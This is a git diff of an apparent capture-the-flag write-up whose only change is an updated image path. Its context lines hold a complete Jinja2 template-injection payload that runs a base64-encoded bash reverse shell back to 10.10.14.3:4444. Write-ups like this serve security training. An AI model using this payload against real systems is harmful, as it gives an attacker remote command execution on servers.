@@ -140,7 +140,7 @@ What works is a `base64` encoded bash reverse shell command since the UID of the
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMSAK | base64 -d | bash').read() }}
 ```
 
-<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (129) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
